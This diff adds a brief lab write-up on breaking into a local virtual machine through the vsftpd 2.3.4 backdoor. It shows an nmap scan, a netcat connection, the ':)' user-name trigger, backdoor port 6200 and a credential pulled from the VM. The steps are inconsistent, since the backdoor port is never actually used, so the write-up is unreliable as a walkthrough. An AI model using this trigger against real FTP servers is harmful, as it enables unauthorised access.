@@ -1,0 +1,37 @@
+This is VSFTPD Backdoor problem.
+The vulnerability exploited ":)" in the login user name.
+
+This is how I get access to the VM:
+
+_First: I find the IP Address of the VM by pressing combination keys "fn", alt(option), and "f6".
+And I got "192.168.56.101"
+
+_Second: I run N-Map on the IP address "192.168.56.101" to get which port, and service are use.
+I see that vsftpd is on port "21". 
+
+>> nmap -A -T4 192.168.56.101
+
+Nmap scan report for 192.168.56.101
+Host is up (0.00066s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.0.8 or later
+22/tcp open  ssh     OpenSSH 6.0p1 Debian 3ubuntu1 (Ubuntu Linux; protocol 2.0)
+
+_Third: I run Net-Cat to look for vulnerability. 
+And I got ":)"
+I also google and found out that vsFTPd 2.3.4 has a backdoor port "6200" 
+link: http://en.wikipedia.org/wiki/Vsftpd
+So I enter "Hack:)" as user-name and "pingo" as password.
+
+>> nc 192.168.56.101 21 -v 
+220 Welcome to vsFTPd 2.3.4. Smile at login :).
+
+Therefore, I got inside the VM.
+Once I'm inside run "cat WELCOME" to get the username and password 
+I got this:
+
+user: vsftpd
+pass: q35&bTB>
+
+
